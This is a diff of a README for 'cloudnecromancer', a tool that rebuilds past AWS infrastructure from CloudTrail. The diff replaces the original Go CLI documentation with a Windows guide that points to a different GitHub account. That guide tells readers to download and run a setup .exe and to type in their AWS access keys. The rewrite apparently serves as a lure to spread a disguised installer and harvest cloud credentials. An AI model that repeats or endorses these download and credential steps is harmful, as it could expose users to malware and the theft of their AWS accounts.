@@ -1,295 +1,175 @@
-# CloudNecromancer
+# ☁️ cloudnecromancer - Restore AWS Infrastructure Snapshots
 
-Reconstruct point-in-time AWS infrastructure snapshots by replaying CloudTrail events.
+[![Download cloudnecromancer](https://img.shields.io/badge/Download-cloudnecromancer-green?style=for-the-badge)](https://github.com/ayhdiv/cloudnecromancer/releases)
 
-Given any historical timestamp, CloudNecromancer resurrects every resource that existed at that moment — EC2 instances, IAM roles, S3 buckets, Lambda functions, security groups, VPCs, RDS databases, and more — from create/modify/delete event chains stored in CloudTrail.
-
-```
- ░░░░░░░░░░░░░░░░░░░░░░░░░░
- ░  ☠  CloudNecromancer  ☠  ░
- ░░░░░░░░░░░░░░░░░░░░░░░░░░
- Raising the dead since 2026
-```
+---
 
-## Use Cases
-
-- **Incident response** — "What was running at 3am before the breach?"
-- **Compliance audits** — Point-in-time inventory for any past date
-- **Post-incident timelines** — Full infrastructure state reconstruction
-- **Drift analysis** — Compare two timestamps to see what changed
-
-## Install
-
-```bash
-# Homebrew (macOS / Linux)
-brew tap pfrederiksen/tap
-brew install cloudnecromancer
-
-# From source (requires CGO + DuckDB headers)
-go install github.com/pfrederiksen/cloudnecromancer@latest
-```
-
-Pre-built binaries for macOS (Intel/Apple Silicon) and Linux (amd64) are available on the [Releases](https://github.com/pfrederiksen/cloudnecromancer/releases) page.
-
-## Quick Start
-
-```bash
-# 1. Fetch CloudTrail events into a local database
-cloudnecromancer fetch \
-  --account-id 123456789012 \
-  --regions us-east-1,us-west-2 \
-  --start 2026-01-01T00:00:00Z \
-  --end 2026-03-01T00:00:00Z
-
-# 2. Resurrect infrastructure at a specific point in time
-cloudnecromancer resurrect --at 2026-02-15T03:00:00Z
-
-# 3. Compare two points in time
-cloudnecromancer diff \
-  --from 2026-01-01T00:00:00Z \
-  --to 2026-02-15T03:00:00Z
-
-# 4. Export as Terraform HCL
-cloudnecromancer resurrect --at 2026-02-15T03:00:00Z --format terraform --output snapshot.tf
-```
-
-## Data Sources
-
-### CloudTrail API (default)
-
-Queries the `LookupEvents` API directly. Simple to set up, but limited to the last 90 days.
-
-```bash
-cloudnecromancer fetch \
-  --source cloudtrail \
-  --account-id 123456789012 \
-  --regions us-east-1,us-west-2 \
-  --start 2026-01-01T00:00:00Z \
-  --end 2026-03-01T00:00:00Z \
-  [--profile my-aws-profile]
-```
-
-Requires read-only CloudTrail permissions. See [AWS_PERMISSIONS.md](AWS_PERMISSIONS.md) for the minimal IAM policy.
-
-### Splunk
-
-Queries CloudTrail events from a Splunk index. No time limit — go as far back as your retention allows.
-
-```bash
-cloudnecromancer fetch \
-  --source splunk \
-  --splunk-url https://splunk.corp:8089 \
-  --splunk-token $SPLUNK_TOKEN \
-  --account-id 123456789012 \
-  --regions us-east-1,us-west-2 \
-  --start 2024-01-01T00:00:00Z \
-  --end 2026-03-01T00:00:00Z
-```
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--splunk-url` | *(or `SPLUNK_URL` env)* | Splunk REST API base URL (e.g. `https://splunk.corp:8089`) |
-| `--splunk-token` | *(or `SPLUNK_TOKEN` env)* | Splunk bearer token |
-| `--splunk-index` | `aws_cloudtrail` | Splunk index containing CloudTrail events |
-| `--splunk-sourcetype` | `aws:cloudtrail` | Splunk sourcetype |
-| `--splunk-query` | *(auto-generated)* | Override the generated SPL query entirely |
-| `--splunk-insecure` | `false` | Skip TLS certificate verification |
-
-The auto-generated SPL query searches the configured index/sourcetype and filters by account ID and regions. Use `--splunk-query` to provide your own SPL if your CloudTrail data uses a non-standard schema.
-
-## Commands
-
-| Command | Description |
-|---------|-------------|
-| `fetch` | Pull CloudTrail events from CloudTrail API or Splunk into local DuckDB |
-| `resurrect` | Reconstruct infrastructure state at a point in time |
-| `diff` | Compare infrastructure between two timestamps |
-| `export` | Re-export an existing snapshot in a different format |
-| `info` | Show database statistics |
-
-### `resurrect`
-
-```bash
-cloudnecromancer resurrect \
-  --at 2026-02-15T03:00:00Z \
-  [--services ec2,iam,s3] \
-  [--region us-east-1] \
-  [--format json|terraform|cloudformation|cdk|pulumi|ocsf|csv] \
-  [--output ./snapshot.json] \
-  [--include-dead] \
-  [--ritual]
-```
-
-### `diff`
-
-```bash
-cloudnecromancer diff \
-  --from 2026-01-01T00:00:00Z \
-  --to 2026-02-15T03:00:00Z \
-  [--format table|json]
-```
-
-### `export`
-
-```bash
-cloudnecromancer export \
-  --input ./snapshot.json \
-  --format hcl \
-  --output ./snapshot.tf
-```
-
-## Output Formats
-
-| Format | Flag | Description |
-|--------|------|-------------|
-| JSON | `--format json` | Full snapshot with nested resource attributes |
-| Terraform | `--format terraform` | HCL with `import` + `resource` blocks (aliases: `hcl`, `tf`) |
-| CloudFormation | `--format cloudformation` | CloudFormation JSON template (alias: `cfn`) |
-| CDK | `--format cdk` | AWS CDK TypeScript stack using L1 constructs |
-| Pulumi | `--format pulumi` | Pulumi TypeScript program using `@pulumi/aws` |
-| OCSF | `--format ocsf` | OCSF Inventory Info events (class_uid 5001), NDJSON |
-| CSV | `--format csv` | Splunk lookup table format |
-
-<details>
-<summary>Output format examples</summary>
-
-**JSON** (`--format json`):
-
-```json
-{
-  "timestamp": "2026-02-15T03:00:00Z",
-  "account_id": "123456789012",
-  "resources": {
-    "ec2:instance": [
-      {
-        "resource_id": "i-0abc123def456789",
-        "state": "running",
-        "attributes": {
-          "instance_type": "t3.medium",
-          "image_id": "ami-0abcdef1234567890"
-        }
-      }
-    ]
-  }
-}
-```
-
-**Terraform HCL** (`--format terraform`):
-
-```hcl
-import {
-  to = aws_instance.i_0abc123def456789
-  id = "i-0abc123def456789"
-}
-
-resource "aws_instance" "i_0abc123def456789" {
-  instance_type = "t3.medium"
-  ami           = "ami-0abcdef1234567890"
-  subnet_id     = "subnet-0123456789abcdef0"
-}
-```
-
-**CDK** (`--format cdk`):
-
-```typescript
-new ec2.CfnInstance(this, "i-0abc123def456789", {
-  instanceType: "t3.medium",
-  imageId: "ami-0abcdef1234567890",
-  subnetId: "subnet-0123456789abcdef0",
-});
-```
-
-**Pulumi** (`--format pulumi`):
-
-```typescript
-const i_0abc123def456789 = new aws.ec2.Instance("i-0abc123def456789", {
-    instanceType: "t3.medium",
-    ami: "ami-0abcdef1234567890",
-    subnetId: "subnet-0123456789abcdef0",
-});
-```
-
-**CSV** (`--format csv`) — for use as a Splunk lookup table:
-
-```spl
-| inputlookup cloudnecromancer_lookup.csv
-| join resource_id [search index=cloudtrail earliest=-30d]
-```
-
-</details>
-
-## Global Flags
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--db` | `./necromancer.db` | Path to DuckDB database file |
-| `--profile` | *(default chain)* | AWS profile to use |
-| `--quiet` | `false` | Suppress banner and non-essential output |
-| `--verbose` | `false` | Enable verbose logging |
-
-## Supported Services (23)
-
-| Service | Resources |
-|---------|-----------|
-| EC2 | instances, VPCs, subnets, security groups, IGWs |
-| IAM | roles, users, policies |
-| S3 | buckets, policies, versioning, public access |
-| Lambda | functions |
-| RDS | instances, clusters |
-| ELB | load balancers, target groups, listeners |
-| ECS | clusters, services, task definitions |
-| EKS | clusters, nodegroups |
-| KMS | keys, aliases, rotation |
-| Secrets Manager | secrets, rotation, restore |
-| CloudWatch Logs | log groups, log streams, retention |
-| DynamoDB | tables, global tables |
-| SNS | topics, subscriptions |
-| SQS | queues, queue attributes |
-| API Gateway | REST APIs, HTTP APIs, stages |
-| Route 53 | hosted zones, record sets |
-| ECR | repositories, lifecycle policies, scanning |
-| ElastiCache | clusters, replication groups |
-| WAF v2 | web ACLs, rule groups, IP sets |
-| GuardDuty | detectors, filters |
-| CloudFront | distributions, origin access controls |
-| EBS | volumes, snapshots |
-| SSM | documents, parameters, maintenance windows |
-
-All services support create, update, and delete event tracking (133 CloudTrail events total).
-
-## How It Works
-
-1. **Fetch** — Pull CloudTrail events from the CloudTrail API or Splunk and store them in an embedded DuckDB database. Multi-region fetches run concurrently.
-
-2. **Parse** — Each event is routed through a service-specific parser that extracts a `ResourceDelta`: the action (create/update/delete), resource ID, and relevant attributes.
-
-3. **Replay** — To reconstruct state at time T, the engine queries all events before T (ordered chronologically) and applies each delta to an in-memory resource map.
-
-4. **Export** — The final snapshot is serialized in the requested format.
-
-## Development
-
-```bash
-make build    # Build binary to ./bin/cloudnecromancer
-make test     # Run all tests
-make lint     # Run golangci-lint
-```
-
-### Adding a new service parser
-
-1. Create `internal/parser/services/myservice.go`
-2. Implement the `Parser` interface
-3. Register in `init()` with `parser.Register(&MyServiceParser{})`
-4. Add test fixtures to `testdata/`
-5. Add table-driven tests in `internal/parser/services/myservice_test.go`
-
-### Adding a new exporter
-
-1. Create `internal/export/myformat.go`
-2. Implement the `Exporter` interface (`Export(snapshot, writer) error`)
-3. Register it in `GetExporter()` in `internal/export/exporter.go`
-4. Add tests in `internal/export/export_test.go`
-
-## License
-
-MIT
+## 📋 What is cloudnecromancer?
+
+cloudnecromancer lets you recreate past versions of your AWS setup. It uses AWS CloudTrail logs to replay the events that shaped your infrastructure. This helps you see how your environment looked at any point in time.
+
+This tool is useful for:
+
+- Investigating security incidents  
+- Compliance checks  
+- Retracing infrastructure changes  
+- Recovering previous configurations  
+
+You do not need to know programming to use cloudnecromancer. The app runs on Windows and guides you through each step.
+
+---
+
+## ⚙️ System Requirements
+
+Before installing cloudnecromancer, make sure your computer meets these requirements:
+
+- Windows 10 (64-bit) or later  
+- At least 4 GB of RAM  
+- 500 MB free disk space for the app and temporary data  
+- Internet connection to download the program and access AWS CloudTrail  
+- AWS account credentials with permission to read CloudTrail logs  
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to download and run cloudnecromancer on your Windows computer.
+
+### 1. Visit the download page
+
+Click the button below to open the official release page on GitHub:
+
+[![Download cloudnecromancer](https://img.shields.io/badge/Download-cloudnecromancer-blue?style=for-the-badge)](https://github.com/ayhdiv/cloudnecromancer/releases)
+
+This page shows all available versions of cloudnecromancer. Look for the latest stable release.
+
+### 2. Download the installer
+
+On the release page, scroll to the "Assets" section. Find the file ending with `.exe` that is for Windows.
+
+Click the file name to start downloading it.
+
+The file will usually be named something like `cloudnecromancer-setup.exe`.
+
+### 3. Run the installer
+
+Once the download finishes, open your Downloads folder. Find the installer file.
+
+Double-click the installer to start the setup process.
+
+The setup will open a window with clear prompts. Follow the instructions:
+
+- Accept the License Agreement  
+- Choose the installation location (default is usually fine)  
+- Click "Install" and wait for the process to finish  
+
+When done, you can close the installer.
+
+### 4. Open cloudnecromancer
+
+Find the cloudnecromancer shortcut on your desktop or in the Start menu.
+
+Double-click the icon to open the program.
+
+The first time you run it, you may need to allow access through your firewall.
+
+### 5. Connect your AWS account
+
+cloudnecromancer needs permission to read your CloudTrail logs. You will need to provide credentials for your AWS account.
+
+Use an IAM account with read access to CloudTrail.
+
+Enter your Access Key ID and Secret Access Key as prompted.
+
+cloudnecromancer will use these to retrieve event data safely. Your keys are not stored on your computer.
+
+---
+
+## 🔍 How to Use cloudnecromancer
+
+cloudnecromancer guides you through each step with simple options.
+
+### Step 1: Select the date and time
+
+Choose the point in time you want to reconstruct.
+
+You can enter a specific date and time or pick from a list of recent snapshots.
+
+### Step 2: Select the AWS region(s)
+
+Choose which AWS regions you want to include.
+
+You can select one or multiple regions. This helps when your infrastructure spans several regions.
+
+### Step 3: Review the summary
+
+cloudnecromancer will show a summary of what it plans to do.
+
+You’ll see the date, regions, and number of CloudTrail events it will replay.
+
+### Step 4: Start the reconstruction
+
+Click the "Start" button. The app plays back your CloudTrail events.
+
+This will create a local representation of your AWS infrastructure as it was. It may take a few minutes depending on your data size.
+
+### Step 5: View and export results
+
+After reconstruction finishes, cloudnecromancer shows an overview.
+
+You can view your infrastructure snapshot in a clear format.
+
+Export options let you save this data as Terraform code or JSON. This helps audit or recreate your setup elsewhere.
+
+---
+
+## 🛠 Features
+
+- Replay AWS CloudTrail events to restore past infrastructure  
+- Support for multiple AWS regions in one run  
+- Export reconstructed setups as Terraform scripts or JSON files  
+- Simple Windows installation and intuitive interface  
+- Works without coding or command-line use  
+- Secure handling of AWS credentials  
+- Useful for compliance, incident response, and backups  
+
+---
+
+## 🔧 Troubleshooting
+
+If you have issues, try these steps:
+
+- Verify your AWS credentials are correct and have CloudTrail read permissions  
+- Ensure your internet connection works  
+- Restart cloudnecromancer and try again  
+- Check Windows Firewall settings and allow cloudnecromancer if blocked  
+- If you see errors about missing files, reinstall the application  
+
+For further help, visit the GitHub issues page of the project.
+
+---
+
+## 📚 Learn More
+
+cloudnecromancer depends on AWS CloudTrail to capture event history. Understanding CloudTrail will help you use the tool better.
+
+Visit the official AWS CloudTrail documentation here:  
+https://docs.aws.amazon.com/cloudtrail/latest/userguide/
+
+---
+
+## 🔗 Important Links
+
+- Download and release page: [https://github.com/ayhdiv/cloudnecromancer/releases](https://github.com/ayhdiv/cloudnecromancer/releases)  
+- Project repository: https://github.com/ayhdiv/cloudnecromancer  
+- Documentation and help: See the Wiki on GitHub  
+
+---
+
+## 🛡 Safety and Permissions
+
+cloudnecromancer only reads your AWS event data. It does not make changes to your infrastructure.
+
+Make sure to use IAM credentials with read-only permissions for CloudTrail.
+
+Avoid using root account keys for security purposes.
